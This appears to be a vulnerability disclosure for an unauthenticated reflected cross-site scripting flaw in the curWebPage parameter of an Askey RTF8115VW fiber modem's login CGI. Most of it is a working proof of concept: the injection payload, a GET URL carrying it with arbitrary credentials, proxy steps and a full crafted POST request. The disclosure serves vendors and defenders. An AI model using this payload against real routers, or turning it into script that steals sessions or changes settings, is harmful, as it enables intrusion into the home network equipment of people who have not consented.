**UNAUTHENTICATED Cross-Site Scripting - Askey Internet Fiber Modem**

Vendor: **Askey**   
Software Version: **BR_SV_g11.11_RTF_TEF001_V6.54_V014**  
Model: **RTF8115VW**   
Vulnerable Param: **curWebPage**  
Payload: ```";alert('xss')//```   
Not tested in other model/version.   

Via GET REQUEST
```
At the login request we can issue a GET Request:
http://x.x.x.x/cgi-bin/te_acceso_router.cgi?curWebPage=/settings-internet.asp";alert('xss')//&loginUsername=admin&loginPassword=admin

The Username and Password param, don't need to be valid.
``` 

![Alt text](/xssget.jpg?raw=true "Optional Title")


Via POST REQUEST
```
1) Setup your Proxy (Burp / ZAP / whatever) to intercept the Login request
2) Input the payload after the .asp page used by the curWebPage param
3) Forward the Request
```

The Final Request
```
POST /cgi-bin/te_acceso_router.cgi HTTP/1.1
Host: x.x.x.x
Origin: http://x.x.x.x
Cookie: _httpdSessionId_=ece9eb5b733f7cbc8198ce9b6ab995c2
Upgrade-Insecure-Requests: 1
Referer: http://x.x.x.x/login.asp
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Connection: close
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
Content-Length: 35

curWebPage=%2Fsettings-firewall.asp+payload
 <!---curWebPage=%2Fsettings-firewall.asp";alert('xss')//--->
```

``` 
